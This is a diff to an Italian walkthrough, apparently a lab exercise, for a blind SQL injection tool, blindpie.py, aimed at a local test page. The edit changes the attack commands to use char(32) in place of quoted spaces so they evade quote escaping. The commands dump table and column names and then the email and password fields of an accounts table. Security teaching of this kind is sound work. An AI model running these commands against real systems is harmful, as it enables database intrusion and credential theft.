@@ -19,15 +19,17 @@
 3. Ottengo le prime righe di `information_schema.columns`:
 
     ```
-    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T5 attack --table information_schema.columns --column "concat(table_name, ' ', column_name)" --param to --row 0 --rows 50
+    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T5 attack --table information_schema.columns --column "concat(table_name, char(32), column_name)" --param to --row 0 --rows 50
     ```
+
+    Nota: char(32) corrisponde al carattere 'spazio'.
 
     Ogni riga ritornata dallo script è una coppia `(table_name, column_name)`. Cercando le righe in cui compare la tabella `accounts` si determinano i nomi delle sue colonne.
 
 4.  Estraggo tutti i dati della `accounts`:
 
     ```
-    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T10 attack --table accounts --column "concat(id, ' ', first_name, ' ', last_name, ' ', email, ' ', password)" --param to --row 0 --rows 10
+    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T10 attack --table accounts --column "concat(id, char(32), first_name, char(32), last_name, char(32), email, char(32), password)" --param to --row 0 --rows 10
     ```
 
     Output:
